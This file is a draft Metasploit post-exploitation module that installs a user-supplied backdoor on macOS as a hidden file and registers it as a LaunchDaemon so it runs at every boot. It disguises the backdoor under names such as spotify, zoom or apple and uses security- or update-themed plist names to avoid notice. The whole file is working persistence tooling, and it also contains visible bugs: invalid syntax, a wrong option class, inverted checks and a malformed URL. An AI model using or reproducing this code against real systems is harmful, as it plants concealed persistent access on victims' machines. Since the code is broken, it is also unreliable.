##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
	include Msf::Post::File

	# TODO figure out way to write backdoor payload 
	# TODO add man pages link for launchd.plist
	# Plist & payload written to disk 
	# launch the payload from the plst 
	# todo test

	def initialize(info = {})
		super(
			update_info(
				info, 
				'Name' => 'OSX Launch Daemon Payload Installer',
				'Description' => %q{
					This module provides persistence by installing a payload
					as a Launch Daemon into the /Library/LaunchDaemons/ Directory.
					The payload will be launched before user login at system initialization.
					Unlike Launch Agents the Daemon operates outside of the context 
					of the users session at the system level. 
				},
				'License' => MSF_LICENSE,
				'References'  => [
					# OSX Malware Persistence, thanks Patrick
          			[ 'URL', 'https://taomm.org/vol1/pdfs/CH%202%20Persistence.pdf' ],
          			# Apples official Launch Agent & Launch Daemon docs
          			['URL', 'https://https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html']
         		],
        		'Author' =>  "gardnerapp AKA MewSashi",
        		'Targets' => "OSX", #TODO validate on ARM and x86
        		'SessionTypes' => [ 'shell', 'meterpreter' ]
			)
		)
	end 

	register_options([
		OpString.new("BACKDOOR_PATH",[
			true, "The path to your backdoor. This will be renamed according to the name of the daemon you specify", nil]),
		OptInt.new("DAEMON_NAME",[
			false, 'The name of the backdoor shell and it\'s associated plist',
			0
		]),
		OptBool.new('RUN_NOW',[
			false, 'When set to true the daemon will run as soon as it is 
			loaded. If false it will run the next time launcd boots.', 
			false
		]),
	])

	def exploit
		# if the backdoor supplied by the user doesn't exist on the system fail
		if backdoor_supplied?
			fail_with(Failure::NotFound, 
				"The path to the supplied backdoor #{bckdr_pth} does not exist. Please provide the full path, and check the files existence/permissions. ")
		end 

		# check if the daemon plist file in /Library/LaunchDaemons doesn't already exist
		if daemon_plist_available?
			print_status("Your Daemon name is #{@daemon_plist} and will be stored in /Library/LaunchDaemons.")
		else
			fail_with(Failure::BadConfig, 
				"The LaunchDaemon file #{@daemon_plist} already
				 exists in /Library/LaunchDaemons. Please use a different name for your daemon choose name for your Daemon." )
		end 

		# rename and move the backdoor
		create_daemon_backdoor

		# add the plist file to /Library/LaunchDaemons/
		create_daemon_plist

		# print the removal paths
		removal_details
	end 

	private

	def backdoor_supplied?
		file?(bckdr_pth) ? true : false
	end

	# The path to the backdoor which the user has on the system.
	def bckdr_pth
		@bckdr_pth = datastore["BACKDOOR_PATH"]
	end

	# returns true if the selected .plist file is available in /Library/LaunchDaemons
	def daemon_plist_available?
		f = "/Library/LaunchDaemons/#{daemon_plist}"
		file?(f) true : false
	end 

	# name of the Launch Daemon file to be stored in /Library/LaunchDaemons
	def daemon_plist
		daemon_name
		names = %w[
			security updates analytics important 
			networking monitoring provisioning troubleshooting
		]
		@daemon_plist = "com.#{@daemon_name}.#{rand(names.length-1)}.plist"
	end 

	# set the daemons name
	def daemon_name
		case datastore["DAEMON_NAME"]
		when 0
			@daemon_name = 'msfbackdoor'
		when 1
			@daemon_name = 'spotify'
		when 2 
			@daemon_name = 'zoom'
		when 3
			@daemon_name = 'google'
		when 4
			@daemon_name = 'apple'
		when 5
			@daemon_name = gets('please enter a custom daemon name')
		else 
			fail_with(Failure::BadConfig, 
				"Invalid value #{datastore["DAEMON_NAME"]} provided for 
				DAEMON_NAME.")
		end 
		@daemon_name
	end 

	# renames the backdoor to reflect the spoofed service by the LaunchDaemon. 
	# Moves it into the /Users/Shared directory as a hidden file. 
	def create_daemon_backdoor
		# copy over the backdoor, make it executable and remove the original
		daemon_door = daemon_bckdr_pth
		print_status("copying #{@bckdr_pth} into #{@daemon_bckdr_pth}")

		cmd_exec("cp #{@bckdr_pth} #{@daemon_bckdr_pth}")
		cmd_exec("chmod +x #{@daemon_bckdr_pth}")

		print_status("Removing original backdoor")
		cmd_exec("rm #{@bckdr_pth}")
	end 

	# Reflect theme of spoofed daemon, user proper file extension
	def daemon_bckdr_pth
		@daemon_bckdr_pth = "/Users/Shared/.#{daemon_name}.#{bckdr_pth.split[-1]}"
	end

	# creates the LaunchDaemon plist file which will ultimatly trigger the backdoor upon boot
	def create_daemon_plist
		label = @daemon_plist.delete_suffix(".plist")
		
		plist_path = "/Library/LaunchDaemons/#{@daemon_plist}"

		# OnDemand was deprecated in OSX 10.4 but is kept her for backwards
		# compatibility, it was replaced with the KeepAlive key
		list = <<-EOI
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.appple.com/DTDs/PropertyList-1.0.dtd">
		<plist version="1.0">
			<dict>
				<key>Label</key>
				<string>#{label}</string>
				<key>ProgramArguments</key>
				<array>
					<string>#{@daemon_bckdr_pth}</string>
				</array>
				<key>RunAtLoad</key>
				<true/>
				<key>OnDemand</key>
				<true/>
				<key>KeepAlive</key>
				<true/>
			</dict>
		</plist>
		EOI

		if write_file(plist_path, list)
			print_good("plist successfuly written to #{plist_path}")
		else 
			fail_with(Failure::UnexpectedReply,
			 "Error writing Launch Daemon to #{plist_path}")
		end 

		# The user wants to run the daemon right away
		if datastore["RUN_NOW"]
			print_status("Running the launch daemon.")
			cmd_exec("launchctl load -w #{plist_path}")
		end 
	end 

	def removal_details
		# remove the launch daemon file
		daemon_remove = "\nrm /Library/LaunchDaemons/#{@daemon_plist}\n"

		# remove the executable
		executable_remove = "\nrm #{@daemon_bckdr_pth}\n"

		print_status("To remove the Launch Daemon plist run: #{daemon_remove}")

		print_status("To remove the executable run: #{executable_remove}")
	end 
end 